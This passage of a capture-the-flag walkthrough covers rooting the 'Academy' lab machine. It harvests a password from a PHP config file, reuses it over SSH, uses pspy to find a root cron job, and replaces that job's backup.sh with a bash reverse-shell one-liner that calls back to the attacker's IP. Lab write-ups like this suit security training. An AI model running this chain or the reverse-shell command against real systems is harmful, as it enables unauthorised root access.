+</p><p id="2ba6ec24-2d9b-80ca-9831-d0b8c2c4436f" class="">Now lets look into this php file<br/>cat /var/www/html/academy/includes/config.php</p><figure id="2ba6ec24-2d9b-8038-9539-c5b84a8c643d" class="image"><a href="image%2020.png"><img style="width:626.984375px" src="image%2020.png"/></a></figure><p id="2ba6ec24-2d9b-80c6-8fe8-c7dc1e45a592" class="">it says user grimmie and corresponding password “My_V3ryS3cur3_P4ss”<br/><br/>as we know grimmie is a user with admin priviledge<br/>and we have name and password we can check doing ssh on grimmie</p><figure id="2ba6ec24-2d9b-8037-8660-f612a996761b" class="image"><a href="image%2021.png"><img style="width:626.984375px" src="image%2021.png"/></a></figure><p id="2ba6ec24-2d9b-8074-a108-ede745e3e510" class="">after login into grimmie we dont have sudo somehow<br/>but when we go to /home/grimmie and ls we see <a href="http://backup.sh">backup.sh</a> file <br/><br/>and its some cronjob or periodic check which removes the backup.zip</p><p id="2ba6ec24-2d9b-8016-a21b-c63443562213" class="">lets check with crontab</p><figure id="2ba6ec24-2d9b-805a-af0a-c8b2e81484b9" class="image"><a href="image%2022.png"><img style="width:626.953125px" src="image%2022.png"/></a></figure><p id="2ba6ec24-2d9b-800e-b5c8-c7f091a7bf24" class="">after running crontab we get nothing so there is a “pspy “tool we can use to see  more info and will give us what running in processes and give as validation that its running on a timer.</p><p id="2ba6ec24-2d9b-80df-a553-f6c93a13241b" class="">go ahead and download the 64 bit static version</p><figure id="2ba6ec24-2d9b-808d-8c1d-d26d37b269c1"><div class="source">https://github.com/DominicBreuker/pspy</div></figure><figure id="2ba6ec24-2d9b-80a9-9065-da5636812b68" class="image"><a href="image%2023.png"><img style="width:626.96875px" src="image%2023.png"/></a></figure><p id="2ba6ec24-2d9b-8025-84c9-e158ea90b5be" class="">dump pspy64 through wget, make it executable and run it</p><figure id="2ba6ec24-2d9b-80ce-91bb-e822e7e702fb" class="image"><a href="image%2024.png"><img style="width:626.96875px" src="image%2024.png"/></a></figure><p id="2ba6ec24-2d9b-808a-b50b-f05258fc187a" class="">and we can see <a href="http://backup.sh">backup.sh</a> is running multiple times in a minute or so</p><p id="2ba6ec24-2d9b-80f9-843e-c6a1c1fd3fec" class="">so now we are going to abuse this </p><p id="2ba6ec24-2d9b-8012-9230-cdce2b0c4a9c" class="">go to google and type <br/>”bash reverse shell one liner”</p><figure id="2ba6ec24-2d9b-8039-a5bd-e639107863e1" class="image"><a href="image%2025.png"><img style="width:626.96875px" src="image%2025.png"/></a></figure><p id="2ba6ec24-2d9b-8007-9c9b-d1b8cdcc8593" class="">open this one and first one is one liner bash reverse shell</p><p id="2ba6ec24-2d9b-80ed-b9fb-fbfaa501a15e" class=""><code>bash -i &gt;&amp; /dev/tcp/10.0.2.15/8080 0&gt;&amp;1</code></p><p id="2ba6ec24-2d9b-8051-b4dc-c0080e8a6b02" class="">set the attacker machine ip and listen in port 8080 for reverse connection</p><figure id="2ba6ec24-2d9b-80a0-a430-f39843906095" class="image"><a href="image%2026.png"><img style="width:601px" src="image%2026.png"/></a></figure><p id="2ba6ec24-2d9b-80d0-bdcd-e52b0b4b0e3b" class="">remove the existing content of <a href="http://backup.sh">backup.sh</a> file and paste this one liner shell and save the file</p><p id="2ba6ec24-2d9b-80a0-952b-e41ab2bbc574" class="">now we know cronjob is running this file multiple times in a minute</p><p id="2ba6ec24-2d9b-805c-a2a8-eeb80bf30cd2" class="">so go to listener and see if we are root<br/></p><figure id="2ba6ec24-2d9b-80ca-b7b0-fc4a95bae896" class="image"><a href="image%2027.png"><img style="width:626.984375px" src="image%2027.png"/></a></figure><p id="2ba6ec24-2d9b-807b-b611-ccfa0b508adc" class="">indeed we are root so ls and cat the flag.txt file and we have rooted this box successfully.<br/><br/></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
